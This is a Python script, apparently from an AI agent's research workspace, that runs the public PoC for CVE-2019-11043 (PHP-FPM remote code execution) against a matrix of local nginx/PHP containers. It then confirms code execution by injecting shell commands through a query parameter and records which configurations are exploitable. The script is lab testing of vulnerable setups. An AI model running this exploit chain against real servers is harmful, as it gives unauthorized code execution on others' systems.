#!/usr/bin/env python3
"""CVE-2019-11043 matrix runner. Uses the unmodified public PoC (neex/phuip-fpizdam)."""
import json, re, subprocess, sys, time, urllib.parse, os, hashlib

R = "/tmp/opencode/research/fpm_alt_rce_20261023T084957Z"
POC = os.path.join(R, "poc/phuip-fpizdam.bin")
OUT = os.path.join(R, "raw")
os.makedirs(OUT, exist_ok=True)

V = [("7123", "7.1.32"), ("7223", "7.2.23"), ("7224", "7.2.24"),
     ("7310", "7.3.10"), ("7311", "7.3.11"), ("7433", "7.4.33"), ("8426", "8.4.26")]

B_PORTS = {"7123": 29421, "7223": 29422, "7224": 29423, "7310": 29424,
           "7311": 29425, "7433": 29426, "8426": 29427}
A_PORTS = {"7123": 29451, "7223": 29452, "7224": 29453, "7310": 29454,
           "7311": 29455, "7433": 29456, "8426": 29457}

CASES = []
for tag, ver in V:
    CASES.append((f"A_tryfiles_{ver}", f"http://127.0.0.1:{A_PORTS[tag]}/index.php", "A common-distro-style (split+try_files+PATH_INFO)", ver, "fpmalt-" + tag))
for tag, ver in V:
    CASES.append((f"B_notryfiles_{ver}", f"http://127.0.0.1:{B_PORTS[tag]}/index.php", "B minimal-common (split+PATH_INFO, no try_files)", ver, "fpmalt-" + tag))
CASES += [
    ("C1_stock_default", "http://127.0.0.1:29431/index.php", "C1 stock nginx default (no PHP location)", "n/a", None),
    ("C2_nosplit_7.2.23", "http://127.0.0.1:29432/index.php", "C2 plain location ~ \\.php$ (no split/PATH_INFO)", "7.2.23", None),
    ("C3_distro_snippet_7.1.32", "http://127.0.0.1:29433/index.php", "C3 Debian/Ubuntu fastcgi-php.conf snippet (split+try_files, NO PATH_INFO)", "7.1.32", None),
    ("C3_distro_snippet_7.2.23", "http://127.0.0.1:29434/index.php", "C3 Debian/Ubuntu fastcgi-php.conf snippet (split+try_files, NO PATH_INFO)", "7.2.23", None),
    ("C3_distro_snippet_7.3.10", "http://127.0.0.1:29435/index.php", "C3 Debian/Ubuntu fastcgi-php.conf snippet (split+try_files, NO PATH_INFO)", "7.3.10", None),
]
for tag, ver in [("7123", "7.1.32"), ("7223", "7.2.23"), ("7310", "7.3.10")]:
    CASES.append((f"D_nginx117_{ver}", f"http://127.0.0.1:{29440 + int(tag[:2]) - 71 if False else {'7123':29441,'7223':29442,'7310':29443}[tag]}/index.php",
                  "D nginx 1.17.10 + variant B", ver, "fpmalt-" + tag))

def run(cmd, timeout):
    t0 = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, p.stdout + p.stderr, time.time() - t0
    except subprocess.TimeoutExpired as e:
        return 124, (e.stdout or "") + (e.stderr or "") + "\n[TIMEOUT]", time.time() - t0

def curl(url, timeout=20):
    p = subprocess.run(["curl", "-sS", "--max-time", str(timeout), "-o", "-", "-w", "\n__CODE__%{http_code}", url],
                       capture_output=True, text=True)
    body, _, code = p.stdout.rpartition("\n__CODE__")
    return code.strip() or "000", body

def main():
    results = []
    for name, url, cls, ver, ctr in CASES:
        rec = dict(case=name, url=url, config_class=cls, php=ver, container=ctr)
        code, body = curl(url)
        rec["baseline_code"] = code
        rec["baseline_body"] = body.strip()[:80]
        if code != "200":
            rec.update(qsl="skipped(non-200)", attack="skipped", rce=False, verdict=f"{code} (no PHP execution)")
            results.append(rec); continue
        rc, out, dur = run([POC, "--only-qsl", url], 240)
        open(os.path.join(OUT, f"{name}_onlyqsl.log"), "w").write(out)
        rec["only_qsl_rc"] = rc
        rec["only_qsl_seconds"] = round(dur, 1)
        rec["only_qsl_out"] = out.strip().replace("\n", " | ")[:400]
        if "probably vulnerable" not in out:
            rec.update(attack="not attempted (detector says invulnerable)", rce=False,
                       verdict="no QSL candidates -> not vulnerable")
            results.append(rec); continue
        logf = os.path.join(OUT, f"{name}_attack.log")
        rc, out2, dur2 = run([POC, "--logfile", logf, url], 600)
        rec["attack_rc"] = rc
        rec["attack_seconds"] = round(dur2, 1)
        rec["attack_out"] = out2.strip().replace("\n", " | ")[:400]
        cmds = f"id;hostname;echo FPMALT-PWN-{name};echo FPMALT-PWN-{name} >/tmp/fpmalt_pwn_{name};cat /tmp/fpmalt_pwn_{name}"
        q = urllib.parse.quote(cmds, safe="")
        code2, body2 = curl(url + "?a=" + q)
        rec["post_code"] = code2
        rec["post_body"] = body2.strip()[:400]
        rec["rce"] = "uid=33(www-data)" in body2
        rec["uid_line"] = next((l.strip() for l in body2.splitlines() if l.startswith("uid=")), "")
        if ctr:
            p = subprocess.run(["docker", "exec", ctr, "sh", "-c", f"cat /tmp/fpmalt_pwn_{name} 2>&1; ls -l /tmp/a 2>&1"],
                               capture_output=True, text=True)
            rec["container_marker"] = p.stdout.strip()[:200]
        rec["verdict"] = ("RCE as www-data" if rec["rce"] else "attack ran but no uid evidence")
        results.append(rec)
        print(json.dumps(rec)[:300], flush=True)

    json.dump(results, open(os.path.join(R, "raw", "matrix.json"), "w"), indent=1)

if __name__ == "__main__":
    main()
